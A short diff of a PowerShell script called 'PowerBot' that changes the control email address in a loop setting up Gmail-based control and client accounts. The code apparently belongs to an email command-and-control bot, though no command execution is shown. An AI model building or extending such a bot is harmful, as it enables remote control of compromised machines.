@@ -2,7 +2,7 @@ function PowerBot {
 
     while ($true){
 
-    $Control = 'linuxdemouser@gmail.com'
+    $Control = 'powershelldb@gmail.com'
     $Client = 'powershellbd@gmail.com'
     $Subject = 'PowerBot'
     $Username = 'powershellbd@gmail.com'
